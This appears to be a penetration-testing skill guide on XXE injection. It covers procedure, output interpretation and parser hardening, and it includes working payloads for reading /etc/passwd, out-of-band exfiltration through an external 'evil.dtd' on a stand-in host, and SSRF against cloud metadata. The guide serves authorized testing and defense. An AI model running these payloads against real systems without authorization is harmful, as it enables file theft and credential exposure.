---
name: xxe-injection
domain: 03-web-application-security
description: Use when an app parses XML you can influence — testing whether external entities let you read files, reach internal services, or cause DoS — and the parser hardening that stops it.
difficulty: intermediate
tags: [owasp, xxe, xml, ssrf, injection, web]
tools: [burp, curl]
---

## Purpose

XML External Entity injection abuses a legacy XML feature: an XML document can define entities that pull in external content, including local files and URLs. When a parser processes attacker-supplied XML with that feature enabled, it can be made to read files off the server, make requests on the server's behalf (SSRF), or exhaust resources. This skill covers finding XXE and the one-line parser fix.

## When to use it

Anywhere the app parses XML you can control: SOAP endpoints, XML APIs, file uploads that accept XML/DOCX/SVG/SAML, or any `Content-Type: application/xml`. It's easy to miss because the XML is often buried in an import or a document format.

## Procedure

1. Find XML entering the app. Try switching a JSON request to XML, or look for endpoints already taking XML (SOAP, RSS import, SVG/Office uploads, SAML responses).
2. Test whether **external entities are processed** at all with an out-of-band probe — define an entity pointing at a listener you control and see if the server calls it:
   ```xml
   <?xml version="1.0"?>
   <!DOCTYPE r [<!ENTITY x SYSTEM "http://your-collaborator.tld/xxe">]>
   <r>&x;</r>
   ```
   A hit on your listener confirms the parser resolves external entities.
3. Escalate to **file read** — pull a local file into the response (in-band XXE):
   ```xml
   <!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
   <r>&x;</r>
   ```
4. If the response doesn't reflect the entity (blind XXE), exfiltrate **out-of-band** using an external DTD that sends the file contents to your server:
   ```xml
   <!DOCTYPE r [<!ENTITY % d SYSTEM "http://your.tld/evil.dtd"> %d;]>
   ```
5. Test **SSRF via XXE** — point a `SYSTEM` entity at internal services or cloud metadata (`http://169.254.169.254/...`); ties into the SSRF and metadata skills.
6. Note but do **not** fire billion-laughs / entity-expansion DoS against a live target — flag the possibility instead of causing an outage.

## Cheatsheet

```xml
<!-- OOB detection -->
<!DOCTYPE r [<!ENTITY x SYSTEM "http://LISTENER/xxe">]><r>&x;</r>

<!-- in-band file read -->
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>

<!-- blind / OOB exfil via external DTD (evil.dtd on your server) -->
<!DOCTYPE r [<!ENTITY % d SYSTEM "http://LISTENER/evil.dtd"> %d;]>

<!-- SSRF pivot -->
<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/">
```

```
also try:  php://filter/convert.base64-encode/resource=... (read binary/PHP)
hidden XML: .docx/.xlsx (unzip -> XML), .svg uploads, SAML assertions
```

## Reading the output

- **A callback on your listener** confirms external entities are processed — vulnerable, even if nothing is reflected (blind XXE).
- **File contents in the response** (`/etc/passwd`, config files) = confirmed file-read XXE; often high severity depending on what's readable.
- **OOB exfil succeeding** = blind XXE is still fully exploitable; don't dismiss a non-reflecting endpoint.
- **An internal URL or metadata response** = XXE-driven SSRF, which can reach credentials on cloud instances — escalate accordingly.
- **No entity resolution at all** = the parser is likely already hardened; note it as not vulnerable.

## The fix

XXE has a clean, definitive fix: **disable external entities and DTD processing** in the XML parser. It's usually a couple of lines and rarely breaks anything, since almost no application legitimately needs external entities.

```java
// Java example — disable DOCTYPE entirely (strongest)
DocumentBuilderFactory f = DocumentBuilderFactory.newInstance();
f.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
f.setFeature("http://xml.org/sax/features/external-general-entities", false);
f.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
f.setXIncludeAware(false);
f.setExpandEntityReferences(false);
```

The equivalent exists for every language/parser (libxml `LIBXML_NOENT` off / `noent=False`, .NET `XmlResolver=null`, Python `defusedxml`). Preferred order: disable DOCTYPE completely; if the app genuinely needs DTDs, at least disable external general and parameter entities. As defence in depth, keep the parsing service on least-privilege file and network access so a missed setting yields little.

## Pitfalls

- **Testing only reflected XXE.** Blind XXE via OOB exfiltration is just as exploitable — a non-reflecting endpoint isn't safe.
- **Missing XML inside other formats.** DOCX, XLSX, SVG, and SAML are XML under the hood; the upload that "only takes images" may parse SVG.
- **Firing entity-expansion DoS at production.** Billion-laughs can take the service down. Flag it, don't detonate it.
- **Partial fixes.** Disabling general entities but leaving parameter entities on still allows OOB blind XXE. Disable DOCTYPE outright where you can.

## References

- OWASP WSTG-INPV-07 (Testing for XML Injection)
- OWASP XXE Prevention Cheat Sheet
- CWE-611
- defusedxml / language-specific hardening docs
